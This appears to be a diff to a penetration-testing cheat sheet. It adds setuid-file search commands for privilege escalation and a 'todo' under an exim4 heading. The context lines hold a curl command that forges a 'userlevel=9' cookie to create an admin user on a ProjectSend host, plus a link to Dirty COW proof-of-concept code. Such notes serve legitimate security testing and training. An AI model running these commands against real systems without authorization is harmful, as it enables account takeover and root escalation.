@@ -409,9 +409,12 @@ https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
 `curl http://projectsend.local/users-add.php -H 'Cookie: userlevel=9' -X POST --data'add_user_form_name=necci&add_user_form_email=poplix@papuasia.org&add_user_form_level=9&add_user_form_user=necci&add_user_form_active=1&add_user_form_pass=123456'`
 
 #### exim4 priviledge escalation
-
+todo
 
 #### find files with setuid / setgid / r+w permissions
+- find setuid permissions
+`> find / -perm -4000 2>/dev/null`
+or
 `> find / -user root -perm -4000 -exec ls -ldb {} \; >/tmp/filename`
 or
 `> find / -perm +4000 -user root -type f -print`
